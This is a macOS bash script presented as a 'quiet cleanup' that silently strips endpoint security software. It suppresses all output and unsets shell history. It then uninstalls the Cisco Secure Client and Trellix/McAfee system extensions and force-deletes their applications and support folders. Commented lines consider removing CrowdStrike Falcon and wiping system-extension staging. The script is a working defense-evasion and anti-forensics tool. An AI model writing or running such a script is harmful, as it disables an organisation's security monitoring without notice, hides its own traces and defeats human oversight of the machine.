#!/bin/bash
# Quiet cleanup script for security tools
# Output suppressed unless errors occur

# Redirect all output to /dev/null for quiet operation
exec 1>/dev/null 2>&1

unset HISTFILE

# Cisco Secure Client
systemextensionsctl uninstall DE8Y96K9QP com.cisco.anyconnect.macos.acsockext >/dev/null 2>&1
rm -rf /Applications/Cisco /Applications/"Cisco Secure Client - Socket Filter.app" /Applications/"Uninstall Cisco Secure Client.app" >/dev/null 2>&1
rm -rf /Library/Application\ Support/Cisco /Library/Extensions/*cisco* 2>/dev/null || true

# Trellix/McAfee
systemextensionsctl uninstall P2BNL68L2C com.trellix.CMF.networkextension >/dev/null 2>&1
rm -rf "/Applications/Trellix Endpoint Security for Mac.app" "/Applications/TrellixSystemExtensions.app" >/dev/null 2>&1
rm -rf /Library/Application\ Support/McAfee /Library/Application\ Support/Trellix /Library/Extensions/*trellix* 2>/dev/null || true

# Falcon (CrowdStrike) - note: likely requires maintenance token
# Attempt quiet uninstall but will fail without token; we suppress output
# /Applications/Falcon.app/Contents/Resources/falconctl uninstall >/dev/null 2>&1 || true
# Do not forcibly remove Falcon app bundle as it may be protected

# Cleanup system extensions staging
# rm -rf /Library/SystemExtensions/* 2>/dev/null || true

# Exit cleanly
exit 0
